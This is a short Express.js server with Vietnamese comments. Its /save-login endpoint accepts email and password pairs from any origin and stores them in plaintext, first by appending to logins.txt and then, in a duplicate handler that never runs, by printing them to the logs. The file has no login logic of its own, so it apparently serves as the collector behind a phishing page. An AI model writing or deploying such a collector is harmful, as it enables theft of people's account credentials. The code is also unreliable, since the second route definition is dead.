const express = require("express");
const fs = require("fs");
const cors = require("cors");

const app = express();
app.use(express.json());
app.use(cors());

// Kiểm tra server có hoạt động không
app.get("/", (req, res) => {
    res.send("Server đang chạy trên Render!");
});

// API lưu thông tin đăng nhập
app.post("/save-login", (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
    }

    const log = `Email: ${email}, Password: ${password}\n`;
    fs.appendFile("logins.txt", log, (err) => {
        if (err) {
            return res.status(500).json({ message: "Lỗi khi lưu dữ liệu" });
        }
        res.json({ message: "Dữ liệu đã lưu thành công!" });
    });
});

// **Lắng nghe trên 0.0.0.0 và dùng PORT của Render**
const port = process.env.PORT || 10000;
app.listen(port, "0.0.0.0", () => {
    console.log(`Server đang chạy trên cổng ${port}`);
});

app.post("/save-login", (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ message: "Thiếu email hoặc mật khẩu" });
    }

    const log = `Email: ${email}, Password: ${password}`;
    console.log(log); // In ra logs thay vì ghi file

    res.json({ message: "Dữ liệu đã nhận!" });
});

